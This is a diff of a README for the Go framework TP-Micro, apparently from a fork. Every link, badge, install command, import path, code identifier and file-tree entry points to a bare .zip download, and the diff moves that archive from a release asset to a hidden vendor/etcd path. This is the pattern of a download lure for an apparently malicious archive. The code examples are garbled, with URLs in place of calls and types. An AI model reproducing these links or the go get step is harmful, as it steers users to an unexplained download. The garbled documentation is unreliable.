@@ -1,11 +1,11 @@
-# TP-Micro [![GitHub release](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) [![report card](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) [![github issues](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip%3Aopen+is%3Aissue) [![github closed issues](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip%3Aissue+is%3Aclosed) [![GoDoc](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) [![view examples](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) [![view teleport](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) [![view Go网络编程群](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip官方QQ群-Go网络编程(42730308)https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+# TP-Micro [![GitHub release](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) [![report card](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) [![github issues](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip%3Aopen+is%3Aissue) [![github closed issues](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip%3Aissue+is%3Aclosed) [![GoDoc](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) [![view examples](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip%https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) [![view teleport](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip%https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) [![view Go网络编程群](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip官方QQ群-Go网络编程(42730308)https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
 
-TP-Micro v3 is a simple, powerful micro service framework based on [Teleport v4](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip).
+TP-Micro v3 is a simple, powerful micro service framework based on [Teleport v4](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip).
 
-[简体中文](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+[简体中文](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
-![tp-micro flow chart](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+![tp-micro flow chart](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
 ## Install
 
@@ -15,8 +15,8 @@ go version ≥ 1.9
 ```
 
 ```sh
-go get -u -f -d https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-cd $https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+go get -u -f -d https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+cd $https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 go install
 ```
 
@@ -47,8 +47,8 @@ go install
 package main
 
 import (
-    micro "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip"
-    tp "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip"
+    micro "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip"
+    tp "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip"
 )
 
 // Arg arg
@@ -59,20 +59,20 @@ type Arg struct {
 
 // P handler
 type P struct {
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 }
 
 // Divide divide API
-func (p *P) Divide(arg *Arg) (int, *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) {
+func (p *P) Divide(arg *Arg) (int, *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) {
     return arg.A / arg.B, nil
 }
 
 func main() {
-    srv := https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip{
+    srv := https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip{
         ListenAddress: ":9090",
     })
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(new(P))
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip()
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(new(P))
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip()
 }
 ```
 
@@ -82,16 +82,16 @@ func main() {
 package main
 
 import (
-    micro "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip"
-    tp "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip"
+    micro "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip"
+    tp "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip"
 )
 
 func main() {
-    cli := https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(
-        https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip{},
-        https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(":9090"),
+    cli := https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(
+        https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip{},
+        https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(":9090"),
     )
-    defer https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip()
+    defer https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip()
 
     type Arg struct {
         A int
@@ -99,26 +99,26 @@ func main() {
     }
 
     var result int
-    rerr := https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("/p/divide", &Arg{
+    rerr := https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("/p/divide", &Arg{
         A: 10,
         B: 2,
     }, &result).Rerror()
     if rerr != nil {
-        https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("%v", rerr)
+        https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("%v", rerr)
     }
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("10/2=%d", result)
-    rerr = https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("/p/divide", &Arg{
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("10/2=%d", result)
+    rerr = https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("/p/divide", &Arg{
         A: 10,
         B: 0,
     }, &result).Rerror()
     if rerr == nil {
-        https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("%v", rerr)
+        https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("%v", rerr)
     }
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("test binding error: ok: %v", rerr)
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("test binding error: ok: %v", rerr)
 }
 ```
 
-[More Examples](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+[More Examples](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
 ## Learn `micro` Command
 
@@ -145,7 +145,7 @@ OPTIONS:
 
 example: `micro gen -p ./myapp` or default `micro gen myapp`
 
-- The initial template file `https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip`:
+- The initial template file `https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip`:
 
 ```go
 // package __TPL__ is the project template
@@ -232,51 +232,51 @@ type Meta struct {
 - The template generated by `micro gen` command.
 
 ```
-├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 ├── config
-│   └── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+│   └── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 ├── internal
 │   ├── handler
-│   │   ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-│   │   └── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+│   │   ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+│   │   └── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 │   └── model
-│       ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-│       ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-│       ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-│       ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-│       └── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+│       ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+│       ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+│       ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+│       ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+│       └── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 ├── log
 │   └── PID
-├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 └── sdk
-    ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-    ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-    ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-    ├── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
-    └── https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+    ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+    ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+    ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+    ├── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
+    └── https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 ```
 
 **Desc:**
 
-- This `micro gen` command only covers files with the "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip" suffix if the `https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip` file exists
+- This `micro gen` command only covers files with the "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip" suffix if the `https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip` file exists
 - Add `.gen` suffix to the file name of the automatically generated file, DO NOT EDIT!
 - `.tmp` is temporary code used to ensure successful compilation!<br>It will be overwritten when `micro gen` is run!<br>When the project is completed, it should be removed!
 - The type of handler's parameter and result must be struct!
-- You can modify the created template file `https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip`, and run the `micro gen` command again to update the project
+- You can modify the created template file `https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip`, and run the `micro gen` command again to update the project
 
-[Generated Default Sample](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+[Generated Default Sample](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
-### Create https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(only)
+### Create https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(only)
 
 `micro newdoc` command help:
 
 ```
 NAME:
-   micro newdoc - Generate a tp-micro project https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+   micro newdoc - Generate a tp-micro project https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 
 USAGE:
    micro newdoc [command options] [arguments...]
@@ -333,7 +333,7 @@ OPTIONS:
  ```
 
 
-[More Micro Command](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+[More Micro Command](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
 ## Usage
 
@@ -341,25 +341,25 @@ OPTIONS:
 
 ```go
 // Start a server
-var peer1 = https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip{
+var peer1 = https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip{
     ListenAddress: "0.0.0.0:9090", // for server role
 })
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip()
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip()
 
 ...
 
 // Start a client
-var peer2 = https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip{})
-var sess, err = https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("127.0.0.1:8080")
+var peer2 = https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip{})
+var sess, err = https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("127.0.0.1:8080")
 ```
 
 ### Call-Controller-Struct API template
 
 ```go
 type Aaa struct {
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 }
-func (x *Aaa) XxZz(arg *<T>) (<T>, *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) {
+func (x *Aaa) XxZz(arg *<T>) (<T>, *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) {
     ...
     return r, nil
 }
@@ -369,16 +369,16 @@ func (x *Aaa) XxZz(arg *<T>) (<T>, *https://github.com/huizuohaode/tp-micro/rele
 
 ```go
 // register the call route: /aaa/xx_zz
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(new(Aaa))
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(new(Aaa))
 
 // or register the call route: /xx_zz
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip((*Aaa).XxZz)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip((*Aaa).XxZz)
 ```
 
 ### Call-Handler-Function API template
 
 ```go
-func XxZz(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip, arg *<T>) (<T>, *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) {
+func XxZz(ctx https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip, arg *<T>) (<T>, *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) {
     ...
     return r, nil
 }
@@ -388,16 +388,16 @@ func XxZz(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Sof
 
 ```go
 // register the call route: /xx_zz
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(XxZz)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(XxZz)
 ```
 
 ### Push-Controller-Struct API template
 
 ```go
 type Bbb struct {
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 }
-func (b *Bbb) YyZz(arg *<T>) *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip {
+func (b *Bbb) YyZz(arg *<T>) *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip {
     ...
     return nil
 }
@@ -407,17 +407,17 @@ func (b *Bbb) YyZz(arg *<T>) *https://github.com/huizuohaode/tp-micro/releases/d
 
 ```go
 // register the push route: /bbb/yy_zz
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(new(Bbb))
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(new(Bbb))
 
 // or register the push route: /yy_zz
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip((*Bbb).YyZz)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip((*Bbb).YyZz)
 ```
 
 ### Push-Handler-Function API template
 
 ```go
 // YyZz register the route: /yy_zz
-func YyZz(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip, arg *<T>) *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip {
+func YyZz(ctx https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip, arg *<T>) *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip {
     ...
     return nil
 }
@@ -427,13 +427,13 @@ func YyZz(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Sof
 
 ```go
 // register the push route: /yy_zz
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(YyZz)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(YyZz)
 ```
 
 ### Unknown-Call-Handler-Function API template
 
 ```go
-func XxxUnknownCall (ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) (interface{}, *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) {
+func XxxUnknownCall (ctx https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) (interface{}, *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) {
     ...
     return r, nil
 }
@@ -443,13 +443,13 @@ func XxxUnknownCall (ctx https://github.com/huizuohaode/tp-micro/releases/downlo
 
 ```go
 // register the unknown call route: /*
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(XxxUnknownCall)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(XxxUnknownCall)
 ```
 
 ### Unknown-Push-Handler-Function API template
 
 ```go
-func XxxUnknownPush(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip {
+func XxxUnknownPush(ctx https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip {
     ...
     return nil
 }
@@ -459,7 +459,7 @@ func XxxUnknownPush(ctx https://github.com/huizuohaode/tp-micro/releases/downloa
 
 ```go
 // register the unknown push route: /*
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(XxxUnknownPush)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(XxxUnknownPush)
 ```
 
 ### The mapping rule of struct(func) name to URI path:
@@ -484,23 +484,23 @@ func NewIgnoreCase() *ignoreCase {
 type ignoreCase struct{}
 
 var (
-    _ https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip = new(ignoreCase)
-    _ https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip = new(ignoreCase)
+    _ https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip = new(ignoreCase)
+    _ https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip = new(ignoreCase)
 )
 
 func (i *ignoreCase) Name() string {
     return "ignoreCase"
 }
 
-func (i *ignoreCase) PostReadCallHeader(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip {
+func (i *ignoreCase) PostReadCallHeader(ctx https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip {
     // Dynamic transformation path is lowercase
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip().Path = https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip().Path)
